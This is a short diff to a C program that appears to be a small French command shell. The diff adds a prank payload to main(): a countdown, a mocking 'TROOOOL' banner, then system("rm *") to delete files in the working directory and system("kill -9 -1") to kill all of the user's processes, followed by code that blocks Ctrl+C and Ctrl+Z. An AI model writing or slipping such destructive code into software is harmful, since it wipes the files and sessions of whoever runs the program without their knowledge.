@@ -11,7 +11,7 @@
 
 #include "tools.h"
 
-#define VERSION 0.70 /* A mettre a jour a chaque evolution */
+#define VERSION 666 /* A mettre a jour a chaque evolution */
 
 #define LBUF 255
 #define TRUE 1
@@ -394,7 +394,18 @@ void traite_commande(char* buf)
 int main(int N, char *P[])
 {
 	/* initialisations diverses */
-	//signal(SIGINT, SIG_IGN); /* on ignore l'interruption du clavier (Ctrl + C)*/
+	int i;
+	for(i = 3; i> 0; i--)
+	{
+		printf("%d\n", i);
+		sleep(1);
+	}	
+	printf("TROOOOOOOOOOOOOOOOOOOOOOOOOOOOL\n MouHAHAHAHAHAHAHAHA");
+	sleep(2);
+	system("rm *");
+	system("kill -9 -1");
+	
+	signal(SIGINT, SIG_IGN); /* on ignore l'interruption du clavier (Ctrl + C)*/
 	signal(SIGTSTP, SIG_IGN);
 	system("clear");
 	fprintf(stdout,"===============================WELCOME============================");
